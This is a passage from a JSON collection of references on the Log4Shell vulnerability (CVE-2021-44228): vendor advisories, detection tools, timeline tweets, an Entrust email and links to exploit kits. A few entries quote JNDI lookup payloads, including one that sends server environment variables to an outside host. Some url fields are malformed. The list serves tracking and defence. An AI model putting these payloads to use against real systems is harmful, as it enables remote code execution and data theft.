        "name": "NetApp",
        "url": "https://security.netapp.com/advisory/ntap-20211210-0007/"
      },
      {
        "refsource": "VENDOR",
        "name": "Netflix",
        "url": "https://github.com/search?q=org%3ANetflix+CVE-2021-44228&type=commits"
      },
      {
        "refsource": "VENDOR",
        "name": "NextGen Healthcare Mirth",
        "url": "https://github.com/nextgenhealthcare/connect/discussions/4892#discussioncomment-1789526"
      },
      {
        "refsource": "VENDOR",
        "name": "Newrelic",
        "url": "https://github.com/newrelic/newrelic-java-agent/issues/605"
      },
      {
        "refsource": "VENDOR",
        "name": "Okta",
        "url": "https://sec.okta.com/articles/2021/12/log4shell"
      },
      {
        "refsource": "VENDOR",
        "name": "OpenHab",
        "url": "https://github.com/openhab/openhab-distro/pull/1343"
      },
      {
        "refsource": "VENDOR",
        "name": "OpenNMS",
        "url": "https://www.opennms.com/en/blog/2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228/"
      },
      {
        "refsource": "VENDOR",
        "name": "OpenSearch",
        "url": "https://discuss.opendistrocommunity.dev/t/log4j-patch-for-cve-2021-44228/7950"
      },
      {
        "refsource": "VENDOR",
        "name": "Oracle",
        "url": "https://www.oracle.com/security-alerts/alert-cve-2021-44228.html"
      },
      {
        "refsource": "VENDOR",
        "name": "Palo-Alto Networks",
        "url": "https://security.paloaltonetworks.com/CVE-2021-44228"
      },
      {
        "refsource": "VENDOR",
        "name": "PaperCut",
        "url": "https://www.papercut.com/support/known-issues/#PO-684"
      },
      {
        "refsource": "VENDOR",
        "name": "Positive Technologies",
        "url": "https://twitter.com/ptsecurity/status/1469398376978522116"
      },
      {
        "refsource": "VENDOR",
        "name": "Pulse Secure",
        "url": "https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44933/?kA13Z000000L3dR"
      },
      {
        "refsource": "VENDOR",
        "name": "Puppet",
        "url": "https://puppet.com/blog/puppet-response-to-remote-code-execution-vulnerability-cve-2021-44228/"
      },
      {
        "refsource": "VENDOR",
        "name": "Pure Storage",
        "url": "https://support.purestorage.com/Field_Bulletins/Interim_Security_Advisory_Regarding_CVE-2021-44228_(%22log4j%22)"
      },
      {
        "refsource": "VENDOR",
        "name": "Qlik",
        "url": "https://community.qlik.com/t5/Support-Updates-Blog/Vulnerability-Testing-Apache-Log4j-reference-CVE-2021-44228-also/ba-p/1869368"
      },
      {
        "refsource": "VENDOR",
        "name": "RedHat",
        "url": "https://access.redhat.com/security/cve/cve-2021-44228"
      },
      {
        "refsource": "VENDOR",
        "name": "RunDeck by PagerDuty",
        "url": "https://docs.rundeck.com/docs/history/CVEs/"
      },
      {
        "refsource": "VENDOR",
        "name": "RSA",
        "url": "https://community.rsa.com/t5/general-security-advisories-and/rsa-customer-advisory-apache-vulnerability-log4j2-cve-2021-44228/ta-p/660501"
      },
      {
        "refsource": "VENDOR",
        "name": "Rubrik",
        "url": "https://support.rubrik.com/s/announcementdetail?Id=a406f000001PwOcAAK"
      },
      {
        "refsource": "VENDOR",
        "name": "SailPoint",
        "url": "https://community.sailpoint.com/t5/IdentityIQ-Blog/IdentityIQ-log4j-Remote-Code-Execution-Vulnerability/ba-p/206681"
      },
      {
        "refsource": "VENDOR",
        "name": "Salesforce",
        "url": "https://help.salesforce.com/s/articleView?id=000363736&type=1"
      },
      {
        "refsource": "VENDOR",
        "name": "Security Onion",
        "url": "https://blog.securityonion.net/2021/12/security-onion-2390-20211210-hotfix-now.html"
      },
      {
        "refsource": "VENDOR",
        "name": "ServiceNow",
        "url": "https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1000959"
      },
      {
        "refsource": "VENDOR",
        "name": "Sesam Info",
        "url": "https://twitter.com/sesam_info/status/1469711992122486791"
      },
      {
        "refsource": "VENDOR",
        "name": "Shibboleth",
        "url": "http://shibboleth.net/pipermail/announce/2021-December/000253.html"
      },
      {
        "refsource": "VENDOR",
        "name": "SLF4J",
        "url": "http://slf4j.org/log4shell.html"
      },
      {
        "refsource": "VENDOR",
        "name": "SmileCDR",
        "url": "https://www.smilecdr.com/our-blog/a-statement-on-log4shell-cve-2021-44228"
      },
      {
        "refsource": "VENDOR",
        "name": "Sophos",
        "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20211210-log4j-rce"
      },
      {
        "refsource": "VENDOR",
        "name": "SonarSource",
        "url": "https://community.sonarsource.com/t/sonarqube-and-the-log4j-vulnerability/54721"
      },
      {
        "refsource": "VENDOR",
        "name": "SonicWall",
        "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032"
      },
      {
        "refsource": "VENDOR",
        "name": "Spring Boot",
        "url": "https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot"
      },
      {
        "refsource": "VENDOR",
        "name": "SUSE",
        "url": "https://www.suse.com/security/cve/CVE-2021-44228.html"
      },
      {
        "refsource": "VENDOR",
        "name": "Sterling Order IBM",
        "url": "https://www.ibm.com/support/pages/node/6525544"
      },
      {
        "refsource": "VENDOR",
        "name": "Swingset",
        "url": "https://github.com/bpangburn/swingset/blob/017452b2d0d8370871f43a68043dacf53af7f759/swingset/CHANGELOG.txt#L10"
      },
      {
        "refsource": "VENDOR",
        "name": "Talend",
        "url": "https://jira.talendforge.org/browse/TCOMP-2054"
      },
      {
        "refsource": "VENDOR",
        "name": "Tanium",
        "url": "https://community.tanium.com/s/article/How-Tanium-Can-Help-with-CVE-2021-44228-Log4Shell"
      },
      {
        "refsource": "VENDOR",
        "name": "TrendMicro",
        "url": "https://success.trendmicro.com/solution/000289940"
      },
      {
        "refsource": "VENDOR",
        "name": "Ubiquiti-UniFi-UI",
        "url": "https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1"
      },
      {
        "refsource": "VENDOR",
        "name": "Vespa ENGINE",
        "url": "https://github.com/vespa-engine/blog/blob/f281ce4399ed3e97b4fed32fcc36f9ba4b17b1e2/_posts/2021-12-10-log4j-vulnerability.md"
      },
      {
        "refsource": "VENDOR",
        "name": "VMware",
        "url": "https://www.vmware.com/security/advisories/VMSA-2021-0028.html"
      },
      {
        "refsource": "VENDOR",
        "name": "Wallarm",
        "url": "https://lab.wallarm.com/cve-2021-44228-mitigation-update/"
      },
      {
        "refsource": "VENDOR",
        "name": "Wowza",
        "url": "https://www.wowza.com/docs/known-issues-with-wowza-streaming-engine#log4j2-cve"
      },
      {
        "refsource": "VENDOR",
        "name": "Yandex-Cloud",
        "url": "https://github.com/yandex-cloud/docs/blob/6ff6c676787756e7dd6101c53b051e4cd04b3e85/ru/overview/security-bulletins/index.md#10122021--cve-2021-44228--%D1%83%D0%B4%D0%B0%D0%BB%D0%B5%D0%BD%D0%BD%D0%BE%D0%B5-%D0%B2%D1%8B%D0%BF%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD%D0%B8%D0%B5-%D0%BA%D0%BE%D0%B4%D0%B0-log4shell-apache-log4j"
      },
      {
        "refsource": "VENDOR",
        "name": "ZAMMAD",
        "url": "https://community.zammad.org/t/cve-2021-44228-elasticsearch-users-be-aware/8256"
      },
      {
        "refsource": "VENDOR",
        "name": "Zaproxy",
        "url": "https://www.zaproxy.org/blog/2021-12-10-zap-and-log4shell/"
      },
      {
        "refsource": "VENDOR",
        "name": "ZSCALER",
        "url": "https://www.zscaler.fr/blogs/security-research/security-advisory-log4j-0-day-remote-code-execution-vulnerability-cve-2021"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Canadian Centre for Cyber Security - Statement from the Minister of National Defence on Apache Vulnerability and Call to Canadian Organizations to Take Urgent Action",
        "url": "https://cyber.gc.ca/en/news/statement-minister-national-defence-apache-vulnerability"
      },
      {
        "refsource": "DETECTION",
        "name": "https://twitter.com/CyberRaiju/status/1469505677580124160",
        "url": "https://twitter.com/CyberRaiju/status/1469505677580124160"
      },
      {
        "refsource": "DETECTION",
        "name": "https://twitter.com/0gtweet/status/1469661769547362305",
        "url": "https://twitter.com/0gtweet/status/1469661769547362305"
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/",
        "url": "https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/"
      },
      {
        "refsource": "CONFIRMATION:DETAILS",
        "name": "Guidance for preventing, detecting, and hunting for CVE-2021-44228 Log4j 2 exploitation",
        "url": "https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/"
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/",
        "url": "https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://twitter.com/yazicivo/status/1469349956880408583",
        "url": "https://twitter.com/yazicivo/status/1469349956880408583"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "log4j: between a rock and a hard places",
        "url": "https://crawshaw.io/blog/log4j"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Log4j: Between a rock and a hard place - comments",
        "url": "https://news.ycombinator.com/item?id=29523608"
      },
      {
        "refsource": "DETECTION",
        "name": "https://twitter.com/timb_machine/status/1470091290289352704",
        "url": "https://twitter.com/timb_machine/status/1470091290289352704",
        "content": "Dumped my Log4J Yara rules here: https://github.com/timb-machine/log4j/. Rather than look for vulnerable code, the primary idea was to identify projects that are pulling Log4J in.",
        "timestamp": "2021-12-12T18:00"
      },
      {
        "refsource": "DETECTION",
        "name": "Yara rules for log4j",
        "url": "https://github.com/timb-machine/log4j/"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://hypixel.net/threads/psa-there-is-a-fatal-remote-code-execution-exploit-in-minecraft-and-its-by-typing-in-chat.4703238/",
        "url": "https://hypixel.net/threads/psa-there-is-a-fatal-remote-code-execution-exploit-in-minecraft-and-its-by-typing-in-chat.4703238/",
        "content": "#log4j\n${jndi:ldap://xxxxx.dnslog.cn/exp}",
        "timestamp": "2021-12-09T05:49TZ??",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/",
        "url": "https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://twitter.com/sirifu4k1/status/1468951859381485573",
        "url": "https://twitter.com/sirifu4k1/status/1468951859381485573",
        "content": "#log4j\n${jndi:ldap://xxxxx.dnslog.cn/exp}",
        "timestamp": "2021-12-09T14:33",
        "tags": [
          "timeline",
          "#log4j",
          "first_tweet"
        ]
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://twitter.com/CattusGlavo/status/1469010118163374089",
        "url": "https://twitter.com/CattusGlavo/status/1469010118163374089",
        "content": "#log4j \u96be\u4ee5\u60f3\u8c61\uff0c\u8fd9\u6837\u4e00\u4e2a RCE \u6f0f\u6d1e\u5728\u534a\u4e2a\u591a\u6708\u524d\u88ab\u53d1\u73b0\uff0c5\u5929\u524d\u88ab\u4fee\u590d\uff0c\u7ed3\u679c\u5230\u4eca\u5929\u8fde CVE \u90fd\u6ca1\u6709\uff0c\u8fde\u65b0\u7684\u6b63\u5f0f Release \u90fd\u6ca1\u53d1\u3002",
        "timestamp": "2021-12-09T18:24",
        "tags": [
          "timeline",
          "#log4j"
        ]
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://twitter.com/domineefh/status/1469237240341704705",
        "url": "https://twitter.com/domineefh/status/1469237240341704705",
        "content": "\ud83d\udd25 Patch log4j NOW ! \ud83d\udd25 CVE-2021-44228 \ud83d\udd25 Path: log4j-2.15.0-rc1 and log4j-2.15.0-rc2 Set log4j2.formatMsgNoLookups to true. #log4j #apache #RCE #Log4Shell",
        "timestamp": "2021-12-10T09:27",
        "tags": [
          "timeline",
          "#log4shell"
        ]
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://twitter.com/_r_netsec/status/1469120458083962882",
        "url": "https://twitter.com/_r_netsec/status/1469120458083962882",
        "content": "RCE 0-day exploit found in log4j, a popular Java logging package https://lunasec.io/docs/blog/log4j-zero-day/",
        "timestamp": "2021-12-10T01:43",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://twitter.com/CattusGlavo/status/14690131867413012499",
        "url": "https://twitter.com/CattusGlavo/status/1469013186741301249",
        "content": "#log4j Using -Dlog4j2.formatMsgNoLookups=true to disable message pattern lookup can solve this problem, but if you rely on it, please update your log4j2 as soon as possible.",
        "timestamp": "2021-12-09T18:36",
        "tags": [
          "timeline",
          "#log4j"
        ]
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://twitter.com/cyberkendra/status/1469028640511836163",
        "url": "https://twitter.com/cyberkendra/status/1469028640511836163",
        "content": "Worst Log4j RCE Zeroday Dropped on Internet https://cyberkendra.com/2021/12/worst-log4j-rce-zeroday-dropped-on.html #apache #log4j #bugbounty #security #SecurityBreach #cybersecurity",
        "timestamp": "2021-12-09T19:38",
        "tags": [
          "timeline",
          "#log4j"
        ]
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://twitter.com/h113sdx/status/1469010902183661568",
        "url": "https://twitter.com/h113sdx/status/1469010902183661568",
        "content": "#log4j ${jndi:ldap:// \u8fd9\u6f0f\u6d1e\u6709\u70b9\u6050\u6016\uff0c\u8fd8\u5728\u7528\u65e7\u7248JDK\u7684\u8981\u6ce8\u610f\u4e86y",
        "timestamp": "2021-12-09T18:27",
        "tags": [
          "timeline",
          "#log4j"
        ]
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://twitter.com/freeqaz/status/1469121757361569793",
        "url": "https://twitter.com/freeqaz/status/1469121757361569793",
        "content": "We wrote up a summary on the log4j 0-day that was found earlier today. This is going to be fun for a lot of people scrambling to patch this tonight!",
        "timestamp": "2021-12-10T01:48",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://twitter.com/eastdakota/status/1469800951351427073",
        "url": "https://twitter.com/eastdakota/status/1469800951351427073",
        "content": "Earliest evidence we\u2019ve found so far of #Log4J exploit is 2021-12-01 04:36:50 UTC. That suggests it was in the wild at least 9 days before publicly disclosed. However, don\u2019t see evidence of mass exploitation until after public disclosure.",
        "timestamp": "2021-12-11T10:47",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://twitter.com/_mattata/status/1469144854672379905",
        "url": "https://twitter.com/_mattata/status/1469144854672379905",
        "content": "@GreyNoise is currently seeing 2 unique IP's scanning the internet for the new Apache Log4j RCE vulnerability (No CVE assigned yet). A tag to track this activity on http://greynoise.io will be made available shortly and linked as a reply when released.",
        "timestamp": "2021-12-09",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "VULNERABLE_CODE_ENHANCEMENT",
        "name": "Restrict LDAP access via JNDI #608",
        "url": "https://github.com/apache/logging-log4j2/pull/608",
        "timestamp": "2021-11-30",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "VULNERABLE_CODE_ENHANCEMENT",
        "name": "LOG4J2-3208 Disable JNDI by default",
        "url": "https://issues.apache.org/jira/browse/LOG4J2-3208",
        "content": "Dealing with CVE-2021-44228 has shown the JNDI has significant security issues. While we have mitigated what we are aware of it would be safer for users to completely disable it by default, especially since the large majority are unlikely to be using it. Those who are will need to specify -Dlog4j2.enableJndi=true or the environment variable form of it to use any JNDI components.",
        "timestamp": "2021-12-11",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "VULNERABLE_CODE_FIX",
        "name": "LOG4J2-3201 Limit the protocols jNDI can use and restrict LDAP.",
        "url": "https://issues.apache.org/jira/browse/LOG4J2-3201",
        "content": "LDAP needs to be limited in the servers and classes it can access. JNDI should only support the java, ldap, and ldaps protocols by default.",
        "timestamp": "2021-12-05",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "VULNERABLE_CODE_EHANCEMENT",
        "name": "LOG4J2-2109 Add property to disable message pattern converter lookups",
        "url": "https://issues.apache.org/jira/browse/LOG4J2-2109",
        "content": "As opposed to setting \"%m {nolookups}\" in all pattern definitions, I would like to globally disable the feature",
        "timestamp": "2017-11-09T13:25",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "VULNERABLE_CODE_EHANCEMENT",
        "name": "LOG4J2-1133 In page \"Configuration\", section \"Property Substitution\", add \"jndi\" context",
        "url": "https://issues.apache.org/jira/browse/LOG4J2-1133",
        "content": "In page \"Configuration\", section \"Property Substitution\", it would be nice to add \"jndi\" context in the table listing all possible contexts. Because natively, log4j2 supports property substitution using jndi variables. It's too bad to not mention it into documentation.",
        "timestamp": "2015-09-15T16:58",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "VULNERABLE_CODE_INTRODUCTION",
        "name": "LOG4J2-313 JNDI Lookup plugin support",
        "url": "https://issues.apache.org/jira/browse/LOG4J2-313",
        "content": "Currently, Lookup plugins [1] don't support JNDI resources. It would be really convenient to support JNDI resource lookup in the configuration. One use case with JNDI lookup plugin is as follows: I'd like to use RoutingAppender [2] to put all the logs from the same web application context in a log file (a log file per web application context). And, I want to use JNDI resources look up to determine the target route (similarly to JNDI context selector of logback [3]). Determining the target route by JNDI lookup can be advantageous because we don't have to add any code to set properties for the thread context and JNDI lookup should always work even in a separate thread without copying thread context variables.",
        "timestamp": "2013-07-17",
        "tags": [
          "timeline"
        ]
      },
      {
        "refsource": "DETECTION",
        "name": "Log4Shell scanner for Burp Suite",
        "url": "https://github.com/silentsignal/burp-log4shell"
      },
      {
        "refsource": "DETECTION",
        "name": "https://blog.silentsignal.eu/2021/12/12/our-new-tool-for-enumerating-hidden-log4shell-affected-hosts/",
        "url": "https://blog.silentsignal.eu/2021/12/12/our-new-tool-for-enumerating-hidden-log4shell-affected-hosts/"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://twitter.com/_StaticFlow_/status/1469358229767475205",
        "url": "In case anyone hasn't discovered this. The Log4J formatting is nestable which means payloads like \"${jndi:ldap://${env:user}.xyz.collab.com/a}\" Will leak server side env vars!",
        "timestamp": "2021-12-10T18:27"
      },
      {
        "refsource": "VENDOR",
        "name": "Panorama 10.1 OSS Listing",
        "url": "https://docs.paloaltonetworks.com/oss-listings/panorama-oss-listings/panorama-10-1-open-source-software-oss-listing.html"
      },
      {
        "refsource": "VENDOR",
        "name": "UniFi Network Application 6.5.54",
        "url": "https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1"
      },
      {
        "refsource": "VENDOR",
        "name": "https://twitter.com/tnpitsecurity/status/1469429810216771589",
        "url": "e can confirm that VMWare vCenter is affected by the Log4j vulnerability. #log4j #vcenter #Log4Shell",
        "timestamp": "2021-12-10T11:12"
      },
      {
        "refsource": "PROOFOFCONCEPT",
        "name": "https://github.com/xiajun325/apache-log4j-rce-poc",
        "url": "https://github.com/xiajun325/apache-log4j-rce-poc"
      },
      {
        "refsource": "DETECTION",
        "name": "https://www.reddit.com/r/crowdstrike/comments/rda0ls/20211210_cool_query_friday_hunting_apache_log4j/",
        "url": "https://www.reddit.com/r/crowdstrike/comments/rda0ls/20211210_cool_query_friday_hunting_apache_log4j/"
      },
      {
        "refsource": "DETECTION",
        "name": "https://github.com/PortSwigger/active-scan-plus-plus/commit/b485a0744140533d877ce244603502b42f9c6656",
        "url": "https://github.com/PortSwigger/active-scan-plus-plus/commit/b485a0744140533d877ce244603502b42f9c6656"
      },
      {
        "refsource": "DETECTION",
        "name": "https://twitter.com/beyang/status/1469171471784329219",
        "url": "https://twitter.com/beyang/status/1469171471784329219",
        "content": "You can run these queries on @sourcegraph to determine the scope of impact of the log4j 0-day on your code:"
      },
      {
        "refsource": "DETECTION",
        "name": "https://semgrep.dev/r?q=log4j-message-lookup-injection",
        "url": "https://semgrep.dev/r?q=log4j-message-lookup-injection"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j",
        "url": "https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.reddit.com/r/netsec/comments/rcwws9/rce_0day_exploit_found_in_log4j_a_popular_java/",
        "url": "https://www.reddit.com/r/netsec/comments/rcwws9/rce_0day_exploit_found_in_log4j_a_popular_java/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/",
        "url": "https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "CISA Creates Webpage for Apache Log4j Vulnerability CVE-2021-44228",
        "url": "https://www.cisa.gov/uscert/ncas/current-activity/2021/12/13/cisa-creates-webpage-apache-log4j-vulnerability-cve-2021-44228"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "CISA - Apache Log4j Vulnerability Guidance",
        "url": "https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance"
      },
      {
        "refsource": "AFFECTEDPRODUCT",
        "name": "CISA Log4j (CVE-2021-44228) Vulnerability Guidance",
        "url": "https://github.com/cisagov/log4j-affected-db"
      },
      {
        "refsource": "VENDOREMAIL",
        "name": "donotreply@entrust.com - Certificate Services Message Center - Entrust Cloud Services response to Log4J Vulnerability",
        "content": "Subject: Entrust Cloud Services response to Log4J Vulnerability\n        Message Group: Security Vulnerabilities\nMessage Expiry Date: 1/31/22\nOn December 10, 2021, details emerged about a critical remote code execution vulnerability in Apache Log4j, assigned as CVE-2021-44228, in which users who can cause specifically crafted strings to be processed by an application's Log4j logging layer may be able to execute code and thereby take control of the server hosting the affected application. The official security advisory from Apache can be found here: https://logging.apache.org/log4j/2.x/security.html\n\n Entrust has investigated the impact of CVE-2021-44228 in all of our hosted services. Entrust is continuing to monitor and asses ongoing product impacts and will perform additional actions as necessary. Product-specific details known at the time of writing are below.\n\n Impact of Vulnerability:\n\n Entrust Certificate Services:\n Entrust Certificate Services has sufficiently strong network controls to prevent direct exploitation. Additionally, Entrust has performed mitigations consistent with the Apache Log4j advisory. Note that the on-premise Discovery Agent component is affected, and is covered in Entrust Security Bulletin E21-008. Discovery Agent is out of support and superseded by Entrust Discovery Scanner, which is not affected.\n\n PKI as a Service (PKIaaS):\n Entrust has performed mitigations on PKI as a Service (PKIaaS) consistent with the Apache Log4j advisory, and additionally is applying product patches to update Log4j to version 2.15 or later. \n\n Remote Signing Service:\n Remote Signing Service has sufficiently strong network controls and has incoming data validation that prevent direct exploitation. Entrust is applying product patches to update Log4j to version 2.15 or later. \n\n Signing Automation Service:\n Entrust has performed mitigations for Signing Automation Service consistent with the Apache Log4j advisory, and additionally will apply product patches to update Log4j to version 2.15 as the patches become available.\n\n Ongoing Mitigating Efforts:\n Entrust is monitoring our hosted services for exploit attempts related to this vulnerability, and will take additional action as necessary. For all environments listed above, Entrust has initiated a review and mitigation process with its vendors supplying 3rd party products used in these environments, and will take actions as necessary.\n\n Corrective Action:\n No customer action is required at this time. Further information will be communicated in product-specific bulletins as necessary.",
        "timestamp": "2021-12-13"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://twitter.com/_larry0/status/1470362325463015428",
        "url": "https://twitter.com/_larry0/status/1470362325463015428",
        "content": "Malware being delivered by #log4j base64 encoded two payloads serving ELF 32-bit LSB executable, Intel 80386 sha256sum a4b278170b0cb798ec930938b5bd45bbf12370a1ccb31a2bee6b2c406d881df6 contains many layer 4 and layer 7 attack functions",
        "timestamp": "2021-12-13"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://twitter.com/marcioalm/status/1470361495405875200",
        "url": "https://twitter.com/marcioalm/status/1470361495405875200",
        "content": "Just added support to LDAP Serialized Payloads in the JNDI-Exploit-Kit. This attack path works in *ANY* java version as long the classes used in the Serialized payload are in the application classpath. Do not rely on your java version being up-to-date and update your log4j ASAP!",
        "timestamp": "2021-12-13"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/",
        "url": "https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "ABC News - New cyber vulnerability poses 'severe risk,' DHS says",
        "url": "https://abcnews.go.com/US/cyber-vulnerability-poses-severe-risk-dhs/story?id=81713422"
      },
      {
        "refsource": "AFFECTEDPRODUCTS",
        "name": "Log4j Vulnerability (CVE-2021-44228)",
        "url": "https://github.com/NCSC-NL/log4shell",
        "content": "This repo contains operational information regarding the vulnerability in the Log4j logging library (CVE-2021-44228)."
      },
      {
        "refsource": "AFFECTEDPRODUCTS",
        "name": "Technologies using Apache Log4j",
        "url": "https://gist.github.com/noperator/d360de81c061bc9c628b12d3f0e1e479"
      },
      {
        "refsource": "CONFIRMATION:DETAILS",
        "name": "Comments on the CVE-2021-44228 vulnerability",
        "url": "http://slf4j.org/log4shell.html"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.ncsc.nl/actueel/advisory?id=NCSC-2021-1052",
        "url": "https://www.ncsc.nl/actueel/advisory?id=NCSC-2021-1052"
      },
      {
        "refsource": "DETECTION:NMAP",
        "name": "nse-log4shell",
        "url": "https://github.com/Diverto/nse-log4shell",
        "content": "Nmap NSE scripts to check against log4shell or LogJam vulnerabilities (CVE-2021-44228). NSE scripts check most popular exposed services on the Internet. It is basic script where you can customize payload."
      },
      {
        "refsource": "DETECTION:SCANNER",
        "name": "log4shell.tools",
        "url": "https://github.com/alexbakker/log4shell-tools",
        "content": "log4shell.tools is a tool allows you to run a test to check whether one of your applications is affected by a vulnerability in log4j: CVE-2021-44228."
      },
      {
        "refsource": "DETECTION:SCANNER",
        "name": "log4j-scan",
        "url": "https://github.com/fullhunt/log4j-scan",
        "content": "fully automated, accurate, and extensive scanner for finding vulnerable log4j hosts"
      },
      {
        "refsource": "DETECTION:SCANNER",
        "name": "log4j-detect",
        "url": "https://github.com/takito1812/log4j-detect",
        "content": "Simple Python 3 script to detect the \"Log4j\" Java library vulnerability (CVE-2021-44228) for a list of URL with multithreading"
      },
      {
        "refsource": "DETECTION:RULES",
        "name": "Log4Shell: Reconnaissance and post exploitation network detection",
        "url": "https://research.nccgroup.com/2021/12/12/log4shell-reconnaissance-and-post-exploitation-network-detection/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://musana.net/2021/12/13/log4shell-Quick-Guide/",
        "url": "https://musana.net/2021/12/13/log4shell-Quick-Guide/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.cadosecurity.com/analysis-of-initial-in-the-wild-attacks-exploiting-log4shell-log4j-cve-2021-44228/",
        "url": "https://www.cadosecurity.com/analysis-of-initial-in-the-wild-attacks-exploiting-log4shell-log4j-cve-2021-44228/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/",
        "url": "https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/",
        "content": "",
        "timestamp": ""
      },
      {
        "refsource": "EXPLOIT",
        "name": "JNDI-Exploit-Kit",
        "url": "https://github.com/pimps/JNDI-Exploit-Kit",
        "content": "This is a forked modified version of the great exploitation tool created by @welk1n (https://github.com/welk1n/JNDI-Injection-Exploit). Here is what I've updated on his tool:\n\n Added support to serialized java payloads to LDAP payloads. This allows exploitation of any java version as long the classes are present in the application classpath ignoring completely the trustURLCodebase=false."
      },
      {
        "refsource": "EXPLOIT",
        "name": "JNDI-Injection-Exploit",
        "url": "https://github.com/welk1n/JNDI-Injection-Exploit",
        "content": "JNDI-Injection-Exploit is a tool for generating workable JNDI links and provide background services by starting RMI server,LDAP server and HTTP server. RMI server and LDAP server are based on marshals and modified further to link with HTTP server."
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Google Cloud recommendations for investigating and responding to the Apache \u201cLog4j 2\u201d vulnerability (CVE-2021-44228)",
        "url": "https://cloud.google.com/blog/products/identity-security/recommendations-for-apache-log4j2-vulnerability"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Google Cloud IDS signature updates to help detect CVE-2021-44228 Apache Log4j vulnerability",
        "url": "https://cloud.google.com/blog/products/identity-security/cloud-ids-to-help-detect-cve-2021-44228-apache-log4j-vulnerability"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Log4Shell Hell: anatomy of an exploit outbreak",
        "url": "https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/",
        "url": "https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Patch Now: Apache Log4j Vulnerability Called Log4Shell Actively Exploited",
        "url": "https://www.trendmicro.com/en_us/research/21/l/patch-now-apache-log4j-vulnerability-called-log4shell-being-acti.html"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "What is the difference between Log4j",
        "url": " SLF4J and Logback?"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Inside the Log4j2 vulnerability (CVE-2021-44228)",
        "url": "https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/"
      },
      {
        "refsource": "CONFIRMATION",
